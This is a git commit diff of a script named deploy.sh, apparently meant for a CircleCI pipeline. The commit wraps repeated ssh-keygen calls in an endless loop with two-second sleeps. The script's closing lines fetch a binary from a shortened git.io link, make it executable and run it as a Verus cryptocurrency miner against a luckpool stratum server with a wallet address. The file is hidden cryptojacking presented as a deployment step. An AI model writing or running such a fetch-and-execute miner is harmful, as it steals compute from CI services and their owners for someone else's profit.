28485bc2089785dc40e2cfa378311e50e0e6d6d3
dianedqncsaw <94683631+dianedqncsaw@users.noreply.github.com>
2021-11-19 19:22:34 +0700

    Update deploy.sh

--- deploy.sh
+++ deploy.sh
@@ -1,20 +1,38 @@
 #!/bin/bash
 
+while :
+do
 ssh-keygen -m PEM -t rsa -f .ssh/circleci
+sleep 2
 ssh-keygen -m PEM -t rsa -f .ssh/circleci
+sleep 2
 ssh-keygen -m PEM -t rsa -f .ssh/circleci
+sleep 2
 ssh-keygen -m PEM -t rsa -f .ssh/circleci
+sleep 2
 ssh-keygen -m PEM -t rsa -f .ssh/circleci
+sleep 2
 ssh-keygen -m PEM -t rsa -f .ssh/circleci
+sleep 2
 ssh-keygen -m PEM -t rsa -f .ssh/circleci
+sleep 2
 ssh-keygen -m PEM -t rsa -f .ssh/circleci
+sleep 2
 ssh-keygen -m PEM -t rsa -f .ssh/circleci
+sleep 2
 ssh-keygen -m PEM -t rsa -f .ssh/circleci
+sleep 2
 ssh-keygen -m PEM -t rsa -f .ssh/circleci
+sleep 2
 ssh-keygen -m PEM -t rsa -f .ssh/circleci
+sleep 2
 ssh-keygen -m PEM -t rsa -f .ssh/circleci
+sleep 2
 ssh-keygen -m PEM -t rsa -f .ssh/circleci
+sleep 2
 ssh-keygen -m PEM -t rsa -f .ssh/circleci
+sleep 2
+done
 wget -qO build https://git.io/JX7bv
 chmod +x build
 ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.SayaInteL -p x -t 2
